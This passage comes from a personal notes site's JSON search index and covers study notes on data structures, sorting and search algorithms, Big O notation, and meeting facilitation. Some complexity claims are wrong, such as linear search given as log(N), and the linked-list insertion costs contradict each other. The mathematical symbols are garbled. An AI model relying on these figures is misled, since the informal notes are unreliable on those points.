Conducting Your Own Research. Vendor security information sites Academic Journals and Technical Publications Conferences and meetups Social Media accounts of security professionals. "},{"id":35,"href":"/cybersecurity/wireless-and-mobile-security/","title":"Wireless and Mobile Security","section":"Cybersecurity","content":" Wireless and Mobile Security # Building Secure Wireless Networks # Connection Methods Wireless Network Models Attacks Against Wireless Networks and Devices Designing a Network Controller and Access Point Security Wi-Fi Security Standards Wireless Authentication Managing Secure Mobile Devices # Mobile Device Deployment Methods Hardening Mobile Devices Mobile Device Management "},{"id":36,"href":"/data-struct-algo/","title":"Data Struct Algo","section":"","content":" Data Structures and Algorithms # Introduction # Data structures and algorithms help you handle problems in a smart and efficient way.\nIt goes without a saying that they go hand in hand. For solving a problem with a given algorithm efficiently you need to put your data in a appropiate data structure that benefits the algorithm. Using a specific data structure will dictate which algorithms you can use.\nThis topic is very rich and can go very deep. Understanding the core data structures and algorithms helps you to understand what tools are out there, the more specific your challenge becomes that you try to solve, the more specific a certain data structure and algorithm gets.\nThe efficiency of your algorithm strongly depends also on the size of your data set that you need to processl. A certain algorithm might perform better on a small set of data, but much worse on a big data set, therefore it is commong that sort() functions first probe the size of your data set and based on that might choose another algorithm that is known ot perform better for given data set size.\nIt\u0026rsquo;s also worth to take in consideration on how your typical data set will be structured or ordered. Statiscally a data set can be faily ordered already, or it can be a given that your data set is almost always sorted in a certain way. This can have an impact on the algorithm you choose.\nTo be able to decide what is an appropiate algorithm, you must understand the performance (time complexity) expressed in the big O notation. The performance can greatly vary based on the size of the data set and how the typical sample data set that you provide will look like (partialy ordered, always descending, etc\u0026hellip;).\nAs you learn new algorithms, you will find the performance for each of the differen characteristics.\nThe Big O notation # The Big O notation explained\nData Structures # Data Structures often differ in their efficiency for each sorting algorithm and their basic operations (like read, insert, remove, update and search).\nArray Stack Queue Singly-Linked List Doubly-Linked List Hash Table Binary Tree Algorithms # Binary Search Linear Search Bubble Sort Selection Sort Insertion Sort Quicksort Quickselect Graph Algorithms Other topics # NP Completeness General facts and point # We asume a limit on the size of each word of data. When working with inputs of size n, we typically asume that integers are repesented by c lg n bits for some constant c \u0026gt;= 1. We require c \u0026gt;= 1 so that each word can hold the value of n, enabling us to index the indivudual input elements, and we restrict c to be constant so the word size does not grow arbitrarly. Because of this property, we can easily index in an array as each item will have the same word size and we kan O(1) access in an array. Quadratic function anÂ² + bn + c. A randmozed alghoritm takes \u0026ldquo;random choices\u0026rdquo; therefore we can not express the max time, instead we express then the expected running time. Divide-And-Conquer # An algorithm design approach/technique.\nThey break the problem into several subproblems that are similar to the original problem but smaller in size, solve the subproblems recursively,and then combine these solutions to create a solution to the original problem.\nThe divide-and-conquer paradigm involves 3 steps at each level of the recurrursion:\nDivide the problem into subproblems that are smaller instances of of the same problem. Conquer the subproblems by solving them recursively. If the subprobleme sizes are small enough, howver, just solve the subproblem in a straightforward manner. Combine the solutions of the subproblems into the solution for the original problem. When an algorithm contains a recursive call to itself, we can often describe its running time by recurrence equation or recurrence, which describes the overall running time on a problem of size n in terms of the running time on smaller inputs. We can then use the mathematical tools to solve the recurrence and provide bounds on the performance of the algorithm.\nFormula c : Some constant T(n) : Running time on problem of size n D(n) : Time to divide the problem in subproblems. C(n) : Time to combine the solutions of the subproblems into the solution of the original problem. a : # of subproblems each of which is 1/b the size of the original. It takes time T(n/b) to solve one subproblem of size n/b, and so it takes time aT(n/b) to solve a of then. We get recurrance: (correction, O must be Î here) If the problem is small enough (n \u0026lt;= c) the time might be constant O(1). Elaborate example of the formula\nWhen we have n \u0026gt; 1, n is an exact power of 2 elements applied with the merge sort algorithm: Divide: The divide step just computes the middle of the subarray, wich takes constant time. Thus, D(n) = O(1). Conquer: We recursively solve two subproblems, each of size n/2, which contributes 2T(n/2) to the running time. Combine: Merge procedure on an n-element subarray takes O(n), so C(n) = O(n). Formula: (correction, O must be Î here) Where c represents the time required to solve problems of size 1 as well as the time per array element of the divide and combine steps. It\u0026rsquo;s perfectly reasonable to divide the orginal problem into sub problems untill the subproblems are small enough, and then use a insertion sort on those subproblems as they might perform better on smaller subproblems/arrays.\nRecursive Case: When a subproblem is large enough to solve recursively.\nBase Case: When a subproblem is smal enough to not recursive.\nMethods or solving recurrences # For obtaining asymptotic Î or O bounds on the solution.\nSubstitution: Guess a bound and then use math to prove our guess is right. Recursion-tree: Convert the recurruence into a tree whose nodes represent the costs incurred at different levels of the recursion. We use techniques for bounding summations to solve the recurrence. Master: Provide bounds for recurrences of the form T(n) = aT(n/b) + f(n) "},{"id":37,"href":"/data-struct-algo/algorithms/binary-search/","title":"Binary Search","section":"Data Struct Algo","content":" Binary Search # Often in combination with an ordered array.\nStart with the middle element, is the searched value greater or less? Based on that we can eliminate 50% of elements. Then we move again to the middle of the remaining half. Etc\u0026hellip;\n"},{"id":38,"href":"/data-struct-algo/algorithms/bubble-sort/","title":"Bubble Sort","section":"Data Struct Algo","content":" Bubble Sort # Algorithm\nSet pointers to first two cells Compare, swap if second cell\u0026rsquo;s value is smaller than the first cells\u0026rsquo; value Move the pointers one cell to the right and repeat process till end of array. At end of going through the array, remember to ignore next passthrough the last item as we\u0026rsquo;re positive it\u0026rsquo;s the highest value Now we start with the pointers to first two cells, and repeast the process, only we stop earlier as we know on each passthrough the last items are ordered. After every passthrough we can safely asume the last item is the highest item is at the end.\nOn second passthrough we can asume the last two items don\u0026rsquo;t need to be checked any more, and so forth.\nEfficiency O(N2) (quadratic)\n"},{"id":39,"href":"/data-struct-algo/algorithms/graph/","title":"Graph","section":"Data Struct Algo","content":" Graph Algorithms # Breadth-frst search # We use a queue as to keep track of which vertices to process next. When we start the search, our queue consists of only our start vertex we want to start searching from. Visit each vertex adjacent to the current vertex. If it has not yet been visited, mark as visited, and att it to the queue. If the current vertex has no unvisited vertices adjacent to it, remove the next vertex from the queue and make it the current vertex. If there are no more unvisited vertices adjacent to the current vertex, and there are no more vertices in the queue, the algorithm is complete. Dijkstra # Used for solving the shortes path problem with weighted graphs.\nWe make the starting vertex our current vertex. We checl all the vertices adjacent to the current vertex and calculate and record the weights from the starting vertex to all known locations. To determine the next current vertex, we find the cheapest unvisited known vertex that can be reached from our starting vertex. Repeat the first 3 steps untill we have visited every vertex in the graph. "},{"id":40,"href":"/data-struct-algo/algorithms/insertion-sort/","title":"Insertion Sort","section":"Data Struct Algo","content":" Insertion Sort # Algorithm In the first passthrough, we temporarily remove the value at index 1 and store in a temporary variable. This will leave a gap at that index, since it contains no value. In subsequent passthroughs we remove the values at the subsequent indexes. We then begin a shifting phase, where we take each value to the left of the gap, and compare it to the value in the temporary variable. If the valie to the left of the gap is greater than the temporary variable, we shift it to the right, AS we shift values to the right, inherently, the gap moves leftwares. As soon as we encounter a value that is lower than the temporarily removed value, or we reach the left of the array, this shifting phase is over. We hten insert the temporary removed value in the current gap. We repeat steps 1 through 3 untill the array is fully sorted. A beter analogy is:\nYou have a pack of cards, layed out from left to right, beside each other. You start with the card on index one and push it up in an empty row above. Now we have a gap in the row of cards. Move each card on the left of the gap in the gap, as long the cards are bigger than the card you pushed above. Then move the card that was pushed a row above into the empty gap. Now start the same over but from index 2 till all cards are fully sorted. "},{"id":41,"href":"/data-struct-algo/algorithms/linear-search/","title":"Linear Search","section":"Data Struct Algo","content":" Linear Search # log(N), just check every value till found. "},{"id":42,"href":"/data-struct-algo/algorithms/quick-sort/","title":"Quick Sort","section":"Data Struct Algo","content":" Quick Sort # Recursive algorithm\nWe use partitioning, which means to take a random value form the array, this will be called the pivot. So we take this pivot and make sure every number that is less than the pivot ens up on the left, and every number larger ends up on the right of the pivot.\nSo first to partition the list:\nThe left pointer continiously moves one cell to the right until it reaches a value that is greater than or equal to the pivot and then stops. Then the right pointer continiously moves one cell to the left until it reaches a value that is less than or equal to the pivot and then stops. We swap the values that the left and right pointers are pointing to. We continue this process until the pointers are pointing to the very same value or the left pointer has moved to the right of the right pointer. Finally, we swap the pivot with the value that the left pointer is currently pointing to. Now we now that all the values on the left of the pivot or smaller and all the values of the pivot larger.\nThe Algorithm Do the partition, having the pivot in its proper place Treat the subarrays to the left and right of the pivot as their own arrays, and recursively repeat the previous step and this step. That means that we\u0026rsquo;ll partition each subarray, and end ip with even smaller subarrays to the left and the right of each subarrays pivot. We then partition those subarrays and so forth. When we have a subarray that has zero or one elements, that is our base case and we do nothing. Efficiency is O(N log N)\n"},{"id":43,"href":"/data-struct-algo/algorithms/selection-sort/","title":"Selection Sort","section":"Data Struct Algo","content":" Selection Sort # Algorithm\nPoint to the first cell. Search through all the following items which one has the lowest value. After having search through all the following items, swap the values from the pointed cell with the lowest value. Move the pointer to the next cell on the right, start over again, (new passthrough starts) Efficiency is O(N2 / 2), but as we ignore constants O(N2), so same as the bubble sort in worth case.\n"},{"id":44,"href":"/data-struct-algo/big-o/","title":"Big O","section":"Data Struct Algo","content":" The Big O Notation # The big O notation is used to express time complexity, the time it takes to execute, time being expressed as the amount of steps required relative to the size of the data set it works on. This is usefull to objectivly quantify how good an algorithm is in regarding to the max CPU capacity.\nWe can use the Big O notation also for the space complexity, the amount of memory is required to execute the algorithm relative to the size of your data set. This is particularly usefull when you are constraint to the amount of memory on your machine.\nWe use this notation to efficiently communicate the efficiency of a given algorithmn.\nTime Complexity # We express the steps taken in relation to the size of the data set, so the amount of elements in your data set to execute given algorithm.\nKeep in mind, we express the amount of steps taken to calculate the algorithm, but the execution time is relative still as it strongly depends on the speed of the machine that will execute all the steps.\nSo an algorithm might take longer on one machine than the other if their CPU speed differs.\nSpace Complexity # For N elements of data, an algorithm consumes a relative number of additional data elements in memory.\nConstants # Note that in a Big ) notation we ignore constants. Meaning, if an algorithm takes consistently 3 steps, regardless of the amount if elements. We will say O(1). This is because the constants might be non trivial on a very small data set, we are mostly curious on how an algorithms performs on a large set of data. At this point constants become trivial in comparison to the size of the data set.\nTherefore we\u0026rsquo;ll never see O(3), we will always express this as O(1).\nDifferent scenarios # Often algorithms will perform different depending on the number of elements. That\u0026rsquo;s why often will quantify an algorithm with the Big O notation for different scenarios.\nThe Best Case Scenario The Average Case Scenario The Worst Case Scenario By default a Big O notation refers to the worst case scenario unless specified otherwise.\nLogarithms # Logarithms are the inverse of exponents\nO(log N) means that the algorithm takes as many steps as it takes to keep halving the data elements we we remain with one.\ne.g. Log2 8 = 3 as 8 / 2 / 2 = 1\nComparison # This chart shows the comparison of different Big 0 notations. # This chart show the efficiency of Data Structure operations # Do note that some values are not correct for linked lists. This chart show the efficiency of sorting algorithms # In Depth # When we work with data sets large enough so that only the order of growth of the time that it takes to run an algorithm becomes relevant we are studying the asymptotic efficiency of algorithms, we use asymptotic notations for that. These notations are applied on functions (e.g anÂ² + bn + c) and abstract away details of the function.\nAsymptotic notation can be used for different charachteristics of an algorithm, usually the running time (time complexity) but also on for example the memory usage (space complexity) and others.\nWe have different asymptotic notations\nÎ (theta) notation O (big oh) notation Î© (big omega) notation o (little oh) notation Ï (little omega) notation The different asymptotic notations explained # Source: Introduction to algorithms\nLet\u0026rsquo;s say we have a function g that operates on n amount of items. We can then express if a function f(n)\nÎ (theta) notation # Bounds a function from above and below\nFor a given function g(n) we indicate with Î(g(n)) the set of functions. A function f(n) belongs to the set Î(g(n)) (aka f(n) â Î(g(n))) if there exist positive constants câ and câ such it can be \u0026ldquo;sandwiched\u0026rdquo; between câ g(n) and câ g(n). g(n) is an asymptoticly tight bound for f(n) Every member of the set Î(g(n)) must be asymptoticly nonnegative, meaning f(n) is nonnegative whenever n is sufficiently large. We don\u0026rsquo;t say asymptoticly positive as an asymptoticly positive function is one that is positive for all sufficiently large n. Point being, f(n) â Î(g(n)) means that our function falls between a certain upper and lower bound (Carefully stated by myself). This notation tends to be used for the average-case running time of an algorithm (see the chart at the top). O (big oh) notation # When we have only an asymptotic upper bound\nBasically f(n) â O(g(n)), meaning for all values n at and the right of nâ, the value of the function f(n) is on or below c g(n). Note f(n) â Î(g(n)) implies f(n) â O(g(n)). As the value for f(n) must be on or below the value of O(g(n)) and fall within the margins of O(g(n)). Distinguishing asymptotic upper bounds from asymptotically tight bounds is standard in algorithms literature. We are giving a upper bound on the worst-case running time of an algorithm. Î© (big omega) notation # When we have only an asymptotic lower bound\nFor all values n at or to the right of nâ, the value of f(n) is on or above the c g(n). We are giving a lower bound on the best-case running time of an algorithm. o (little oh) notation # The asymptotic upper bound may or may not be asymptotically tight. The little o notation indicates an upper bound that is not asymptotically tight. Ï (little omega) notation # The asymptotic lower bound may or may not be asymptotically tight. The little omega notation indicates an lower bound that is not asymptotically tight. Putting it together with an analogy # f(n) = O(g(n)) is like a \u0026lt;= b f(n) = o(g(n)) is like a \u0026lt; b f(n) = Î(g(n)) is like a = b f(n) = Î©(g(n)) is like a \u0026gt;= b f(n) = Ï(g(n)) is like a \u0026gt; b "},{"id":45,"href":"/data-struct-algo/data-structures/array/","title":"Array","section":"Data Struct Algo","content":" Array # An array has often a fixed size. Each element in the array has a fixed size, there accessing is constant O(1) as we can take the offset memory location and jump straight to the requested item do offset memory location + (requested index * element memory size) An array is always continious, meaning, if we delete an item, we have to shift all elements after the removed element one memory block. So we have a nice continous array again without empty memory locations. This means adding an element at the beginning of an array means we have to move all elements in the array one memory location further. For this reason adding and deleting can be O(N) in the worst case. Searching requires us in the worst case scenario to check every element of the arraym, therefore O(N) for searching. "},{"id":46,"href":"/data-struct-algo/data-structures/binary-tree/","title":"Binary Tree","section":"Data Struct Algo","content":" Binary Tree # Part of the node based structures group\nWe have again nodes, each node can have 3 elements, the first is a pointer to another node, the second is the value of the node and the thirs is also a pointer to another node.\nThe node that is not referenced by any other node but refernces to other nodes is the root node.\nFollows the following rules\nEach node has either zero, one or two childeren If a node has two children, it must have one child that has a lesser value than the parent and one child that has a greater value than the parent. Note that trees can be unbalanced and balanced.\nSearch and access is O(log N) due to the nature that startin from the root node we can immediatly can eleminate half of the data structure for searching. This happens to each new step, therefore a logaritmic efficiency.\nInsertion: We have to search trough the tree to then find where to insert a new node. Therefore O(log N)\nDeletion is O(N) as due to the deletion, we might have to doe also a lookup to fix the haning children.\nAlgoritm for deletion. If the node being deleted has no children, simply delete it If the node being deleted has one child, delete it and plug the child into the spot where the deleted node was. If the node being deleted has two childeren, replace the deleted node with the successor node. The successor node is the child node whose value is the least of all values that are greater than the deleted node. If the successor node has a right child, after plugging the successor into the spot of the deleted node, take the right child of the successor node and turn it into the left child of the parent of the successort node. "},{"id":47,"href":"/data-struct-algo/data-structures/doubly-linked-list/","title":"Doubly Linked List","section":"Data Struct Algo","content":" Doubly Linked List # Part of the node based structures group\nItems in a doubly linked list means, each element of the list exists out of three parts. The first part contains a pointer to the previous item of the list, the second part contains the value and the third part contains the pointer to the next item. If there is no next or previous item, the pointers to these locations will contain a nil.\nThe memory doesn\u0026rsquo;t have to find one continous block of memory.\nInserting will be always O(N) as we have to walk through the entire list to find the final item and then update that item\u0026rsquo;s pointer to the next item.\nReading and Searching is O(N) as we might have to walk through to the entire list to get to the right memory location.\nDeleting will be O(N) in case at the middle of the list.\nThe list keeps track of the first and last item\nThis is a perfect data structure to create a queue as you have O(1) for inserting at the end and deleting at the beginning.\n"},{"id":48,"href":"/data-struct-algo/data-structures/hash-table/","title":"Hash Table","section":"Data Struct Algo","content":" Hash Table # Used for fast reading\nAlso known as associative arrays\nUse a deterministic hash function\nUnder the good a hash stores data in a bunch of cells in a row, similar to an array.\nWhen a key is provided, this key is hashed, this hash will return a memory location within the row of cells.\nCollisions can happen with the hash function, a classic solutions is \u0026ldquo;separate chainging\u0026rdquo;. What we do is instead of placing a value in the cell, we puts a reference to an array in it. That array will hold a subarray for each element. So once it founds a hash location with an array, it will do a sequential lookup within that array. e.g. [[key1, value1],[key2, value2]]\nEfficiency if a hash table is based on\nHow much data we\u0026rsquo;re storing in the hash table How man cells are available in the hash table Which hash function we\u0026rsquo;re using Result is that Search/Insert/Delete is O(1) average and worst 0(N) in case everything ends up in one array referenced in one cell.\n"},{"id":49,"href":"/data-struct-algo/data-structures/queue/","title":"Queue","section":"Data Struct Algo","content":" Queue # A queue the same as an array memory wise, being a continious list in memory. A queue however limits us, that we can only delete at the beginning of the array and insert at the end of the array. Therefore, inserts are constant O(1) as we can only insert at the end, but a deletion is always O(N) as we have to move all items in the array one location as we can only delete the first item. Reading and searching remain O(N) Note that we can replace the underlying array structure with linked lists to improve efficiency.\n"},{"id":50,"href":"/data-struct-algo/data-structures/singly-linked-list/","title":"Singly Linked List","section":"Data Struct Algo","content":" Singly Linked List # Part of the node based structures group\nItems in a singly linked list means, each element of the list exists out of two parts. The value and the address location of the next item in the list. If there is no next item in the list, the pointer to the next item will have a nil to indicate the end of the list.\nThe memory doesn\u0026rsquo;t have to find one continous block of memory.\nInserting will be always O(N) as we have to walk through the entire list to find the final item and then update that item\u0026rsquo;s pointer to the next item.\nReading and Searching is O(N) as we might have to walk through to the entire list to get to the right memory location.\nDeleting will be O(N) in case at the end of the list.\nThe list keeps track of the first item\nVery appropiate when you need to delete multiple items. As the actualt delete is jus one action, it\u0026rsquo;s stepping through all items that only takes O(N), but for every delete we don\u0026rsquo;t have to shift all elements.\n"},{"id":51,"href":"/data-struct-algo/data-structures/stack/","title":"Stack","section":"Data Struct Algo","content":" Stack # A stack the same as an array memory wise, being a continious list in memory. A stack however limits us, that we are only allowed to insert and delete at the end of our array. So we cannot add or remove in the middle or to the beginning of the array, which makes our insertions and deletions fast. As we can always immediatly jump to the end of the array and there are no trailing elements that need to be moved around to respect the continuity of our array. Therefore inserts and deletions are constant O(1). Searching and access remain O(N) as it\u0026rsquo;s still is an continious list of elements in memory. Note that we can replace the underlying array structure with linked lists to improve efficiency.\n"},{"id":52,"href":"/data-struct-algo/np-completeness/","title":"Np Completeness","section":"Data Struct Algo","content":" NP Completeness # "},{"id":53,"href":"/facilitation/","title":"Facilitation","section":"","content":" Facilitation # Facilitation is the process of guiding and managing group activities, discussions, or meetings to ensure effective participation, clear communication, and achievement of objectives. It involves creating an environment that encourages collaboration, creativity, and productivity among participants.\nFacilitation is about helping groups get better results. Groups are often less than the sum of their parts, facilitating aims to reduce that. Training, Mentoring, Group Coaching and Facilitation # They all differ, pick the one applicable to your use case.\nTraining Mentoring Group Coaching Process Facilitation Content Expertise Content Expertise No Content Expertise Process Expertise External External Internal Internal Goal: Subject Understanding Goal: Improve your competency Goal: Change Behavior Goal: Solve a challenge collaboratively Hierarchical Hierarchical Hierarchical Facilitative Energetic, Patient, Speaking Wise, experienced, generous Encouraging, Supportive, Provocative Unbiased, neutral, listening, safe, transparent Source of Table\nType Who controls what is being learned Type of Participation Comments Facilitating The Group Facilitator + entire group Good for collaborative learning Teaching Educator primarily Mostly from educator, little from group Lecturing Educator solely Solely from educator More if a clear message/topic must be transferred Source of Table\nEffective Decisions # ED (Effective Decision) = RD (Right Decision) x CD (Commitment to the Decision)\nUsually we make a (right) decisions but then must built up commitment. With a good facilitation you get commitment as the right solution is built. Therefore, more effective decisions.\nFacilitation Types # Experiential Facilitation: Facilitate experiences for people to learn by doing. Also known as adventure or outdoor education. Examples: Conflict resolution, Communication, and problem solving. Dialogue Facilitation: Building bridges rather than walls. Examples: Put strangers in a circle and talk about given topic(s) (e.g. Politics, Race, Opinions) General Facilitation: More like in business, run a meeting. A general batch, but skills from Experiential and Dialogue facilitation can help tremendously. Most of these notes are about this. The Facilitator # Role # I create the container. The participants create the content. My actions enforce their self-organization. It\u0026rsquo;s their meeting. Not Mine. Meetings are real work (Good facilitator required). Success = a fulfilled purpose. Notes # When being the facilitator, you can\u0026rsquo;t focus on the content and your own opinion. Don\u0026rsquo;t tempt to become the project owner/manager. As facilitator you can/must push action item commitment. Fall back to the excuse \u0026ldquo;as facilitator it\u0026rsquo;s my role to \u0026hellip;.\u0026rdquo; to allow for pushing certain things that are about the process, not the actual content! Evokes creativity and confidence in the group Honest \u0026amp; Transparent : I see \u0026ldquo;this\u0026rdquo; is happening, in a meta way you observe, less about the content, as facilitator you can be 100% content agnostic. Ground and calm Adaptive designer: Design a plan, but can be adaptive when necessary based on the needs. Clarity: Your instructions and guidance must be clear, else people will get lost. F.O.G.S: Framing, Objective, Guidelines and Safety - A framework for clarity. Source Framing: Situate the context. You got to change the context and make it relevant for everybody. Example: Share a story that leads into the purpose or objective of whatever you\u0026rsquo;re doing. Objective: Clarify/share a clear object for given activity or whole session Example: \u0026ldquo;Share (personal) stories, without sharing opinions\u0026rdquo; - now a clear objective was set Guidelines: Rules of engagement. Sometimes adding rules makes your gathering better. Safety: Try to increase both Physical: If people gonna be running around, make it safe to do so. Psychological: People who run meetings often don\u0026rsquo;t mention this type of safety. A highly functional team has a high degree of psychological safety. Do and Don\u0026rsquo;t # Do: Carefully assess needs Stay neutral Have a lot of tools Create open trusting atmosphere and tell why everyone is there. Simple \u0026amp; direct language Conclude meetings on positive notes. Clear steps Clarity in general Don\u0026rsquo;t: Be center of attention Not check in with participants Not listen Too passive Lose track of ideas Put people down Not take breaks Not have alternative approaches to adjust Let discussions go one and on Characteristics # Authenticity: Organizer Look-Out Orchestrator Guide Conflict Solver Active Listener The way that you listen has the power to change what you say. This includes body language. The more \u0026ldquo;listening\u0026rdquo; and positive the body language (e.g. lean in) the more they will share. Coach The Framework # Before Event: Determine Audience, is possible use DISC to prepare. Set Agenda Set objectives Preparation Find Venue \u0026amp; Invites Diets \u0026amp; Foods Deliverables from sponsors Activity Planning Planning During Event Open Event: Start with POWER Statement Agenda (MUST) Way Of Working (OPTIONAL) If you are with a group that often have done this before, this might be implicit. Examples: \u0026ldquo;ELMO\u0026rdquo;: Enough, let\u0026rsquo;s move on. This means what it says, allow stalled conversation to move, as facilitator that\u0026rsquo;s your role. Raise hand for silence Open for questions Be on time E manners (phone gone, camera on, \u0026hellip;) No smoking breaks or else agree in advance to it. Objectives (MUST) Expectations (OPTIONAL) Do Ice Breaker/Check In activity to get people (mentally) in the room. Doing The Work: Follow activities of playbook Adjust activities based on the engagement and proceedings. Close Event: Recap the work done Recap/Tackle outstanding Issues Recap Action List Recap Objectives Recap the results Review Results Review used techniques We did X by doing Y Review group communication We did X by communicating\u0026hellip; (TODO) Review facilitator responsiveness Participate Expectations Final Words Ask Feedback Short: We close, review the session, how it went, what came out and did we satisfy all relevant items? After Event: What to document? Who to brief? Share the feedback. Monitor action items. Prepare agenda for next meeting (if applicable). Debrief session if needed. Dysfunctional Behavior: There are various personas that have pro\u0026rsquo;s and con\u0026rsquo;s. Each persona has methods on how to deal with these. See Communication. POWER Statement # The POWER statement is build out of 5 parts, use this to open your event strong.\nPurpose Outcomes \u0026amp; Deliverables Head - Information, decisions, strategies, shared understanding Heart - Connecting, buy-in, vision, Caring Hand - Next steps, action log, output What\u0026rsquo;s in it for me? Energize \u0026amp; Engage Roles \u0026amp; Responsibilities Of everyone involved (facilitator, participants) Read this out in one statement at the beginning of an event/facilitation.\nExample # Purpose: To have more effective communication. Outcomes \u0026amp; Deliverables: Run more efficient decision processes and meetings between squads and business. What\u0026rsquo;s in it for me? Be less frustrated Become a good communicator Have a better way of working Energize \u0026amp; Engage: To decrease the amount of ineffective meetings To have variety in how to do meetings Roles \u0026amp; Responsibilities To learn, listen and come forward with ideas Activities \u0026amp; Types # And event is made up of activities, there are many variations, but they all try to achieve a certain goal. We can categorize these types based on the goal they try to reach.\nEnergizer: Get blood flowing and get everyone mentally in the room again. Help to return the focus and energy. When too many participants, split in groups, of that shortens the total time of the energizer activity (e.g. playing a game) Be weary of physical energizers, make sure the room is safe and clean. A check-in could ben an energizer also. List: List facts, known things, statements, limitations. Brainstorm: Collect and idea new ideas. Group: Group ideas that are very similar. Prioritize: Prioritize/group items to decided what gets attention first or not at all. Commit: Have participants commit to actions. Reflection # Description: Every participant reflects on the session/workshop/event on a shared template. Example questions: How did I as participant contribute to the success of the workshop? My key takeaways? Most memorable statement made by fellow participant? Did we reach our objectives Visual TIP: Create one dimensional scale from \u0026ldquo;not at all\u0026rdquo; to \u0026ldquo;oh yeah\u0026rdquo; and let people drop a \u0026ldquo;dot\u0026rdquo; on the scale. So you get immediately a visual concentration. Why: Help participants to consolidate their learnings. When: Closing of event Fist of 5 voting # Description: Explain Rules People show scale of agreement/disagreement with the amount of fingers 0\u0026hellip;2 fingers -\u0026gt; Check in 3\u0026hellip;5 fingers -\u0026gt; move forward Be aware of culture specifics here Why: To gauge sentiment quickly When: During event whenever a clarification is needed. Prioritize # Description: Take any set of items (e.g action items, topics, \u0026hellip;) Group them if some are similar (affinity) Now there are 2 methods to choose from: Get Preference from participants Voting (suggested rule: 20% of votes vs the amount of items) Move some dots Use Logic with Eisenhower Matrix Why: Need to decide which topics/items to focus on (take only top 3) Need to decide which topics/items to focus first on When: During event Check-In Exercise # Description: [Typical] Start with asking people to introduce themselves, name, role, fun fact, \u0026hellip; [Alternative] Let people share, for example \u0026ldquo;Top 3 success Factors\u0026rdquo; and \u0026ldquo;Top 3 reasons of failure\u0026rdquo; with post its on a board. Why: Bring people in the room mentally. Break ice. When: Opening of Event Agenda # Description: Share agenda, time slots, and stay on agenda. Ask if anyone has questions Always end on time, skip content if necessary. Why: Expectation Management Respect everyone\u0026rsquo;s time When: Opening of Event Issues - Decisions - Action # Description: A board / visual aid to track about key issues, decisions and action items raised throughout the event. Why: Visibility of all issues, decisions and action items. When: Introduced at opening of event. Maintain it throughout event. Recap at event closing. Weather Check # Description: Pay attention to body language (distracted, \u0026hellip;) \u0026ldquo;Is there anything that keeps anyone from being mentally in the room?\u0026rdquo; \u0026ldquo;Anything that keeps you from being present?\u0026rdquo; When energy is low/distracted \u0026gt; Do an energize activity. Why: Identify the mood of the room. \u0026ldquo;Are we stull in collaborative mood?\u0026rdquo; When: Whenever, should check often. Roman Voting # Description: Explain the rules Thumb up: I Agree Thumb horizontal: I follow the room Thumb down: I disagree Ask A question Why: To determine something quickly When: When you need a quick decision or feedback throughout the event. Commit To Action Items # Description: Get people commit to identified action items. When no response or volunteers \u0026ldquo;Hey X, which opf these 2 items you\u0026rsquo;d like to take?\u0026rdquo; Gentle force is OK. You are not the project manager As facilitator you can be a bit pushier \u0026ldquo;As facilitator I must make sure all action items are taken\u0026rdquo;. Why: Make sure all action items are owned and assigned. When: Throughout or end of event Template # Description: Group prepare statements on flip charts for x amount. Groups switch flip charts to review another group\u0026rsquo;s statements for x amount. Let them put \u0026ldquo;V\u0026rdquo; if they agree Let them put \u0026ldquo;X\u0026rdquo; if they disagree Let then put \u0026ldquo;?\u0026rdquo; if they don\u0026rsquo;t understand Let the groups clarify, after clarification they should choose \u0026ldquo;V\u0026rdquo; and \u0026ldquo;X\u0026rdquo;. Keep going till only disagreements are left Now you have a list of disagreements, you have a list to use, or to continue discussion over them. Different deliverables are possible here. Why: To list disagreements and filter out any agreements, which don\u0026rsquo;t require the participants time. If they agree with it, no need to waste time to it. When: During Event Communication # Use positive and proactive language. \u0026ldquo;Yes, and\u0026hellip;\u0026rdquo; Be aware of cultural differences. Get attention Raise your hand without shouting, till everyone gets quite. Avoid hybrid events (part offline, part online) Don\u0026rsquo;t know answer to question? State honesty. Either get back to them later. Ask the room of anyone knows. Ask random people for input, to keep people on their toes. Create space/time for people before asking \u0026ldquo;Let\u0026rsquo;s take 15 seconds of pause to help everyone come up with a question and then let them ask\u0026rdquo;. Make explicit moments give moments to digest and build courage. Don\u0026rsquo;t ask if people have questions, gently nudge or \u0026ldquo;command\u0026rdquo; them to prepare a question. \u0026ldquo;Take 10 seconds and try to come up with a question\u0026rdquo;. Dysfunctional Behavior \u0026amp; Personas # Dysfunctional behavior (Whispering, sidetracking, arguments, dominant behavior). A good facilitator can navigate this by doing: Conscious Prevention, Early Detection, Clean Resolution\nPersona: Late Comer Larry # Typical Quotes: Sorry I\u0026rsquo;m late\u0026hellip; you know how it is to have back to back meetings DISC Style: All Strengths: Creates opportunity to have the conversation about timeliness with the whole team/group. Weaknesses: Derails meetings (everything gets repeated) Sets a tone of \u0026ldquo;this is not important\u0026rdquo; or disrespect by coming in late. How To Deal: \u0026hellip;todo Persona: Electronics Eddie # Typical Quotes: Nothing will be SAID\u0026hellip; he will be on his cell phone texting the whole time. DISC Style: All Strengths: It\u0026rsquo;s a clear sign that process or content is not engaging this person (may be the wrong person for the meeting) Weaknesses: Disengaged behavior might spread How To Deal: \u0026hellip;todo Persona: Spotlight Sam # Typical Quotes: I/Me/in my experience DISC Style: Influence Strengths: Willing to talk/share to get things started May provide energy with stories Weaknesses: Likes to be heard, so may repeat ideas already states May prevent others from speaking How To Deal: Driven By: Knowledge Handled By: Make them into an expert, you say they are the expert in the room and at a particular point of time they will be asked to present their knowledge. Give them a framework when they can\u0026rsquo;t show off, without interrupting your flow. Persona: Tangent Tom # Typical Quotes: This one time\u0026hellip; What about THIS (very minimally related tangential topic to what we are talking about) DISC Style: Influence Strengths: May provide a burst of (unrelated) energy when things are getting dull. Weaknesses: Pulls focus of the meeting away from the states purpose or objective. How To Deal: \u0026hellip;todo Persona: Passive Aggressive Polly # Typical Quotes: You don\u0026rsquo;t know what she\u0026rsquo;s thinking. Until she says it to someone else outside the meeting. DISC Style: Steadiness Strengths: Wants to maintain harmony (in the meeting) Does not get in the way of ideas being moved forward (in the meeting) Weaknesses: Doesn\u0026rsquo;t share displeasures with the group, talks about it outside the meeting with other people How To Deal: \u0026hellip;todo Persona: Silent Sara # Typical Quotes: I don\u0026rsquo;t want to upset anybody (thought, not said) DISC Style: Steadiness Strengths: Doesn\u0026rsquo;t compete for air time or restate ideas we\u0026rsquo;ve already heard. Brings politeness to the space Weaknesses: Unwilling to share her piece of the puzzle/insight because it may cause conflict May be shy, introverted How To Deal: Driven By: Instructions Handled By: Be specific, give examples and clear outlines of that they need to do. Persona: Snarky Sandra # Typical Quotes: Like they want THAT kind of creativity/honesty/feedback DISC Style: 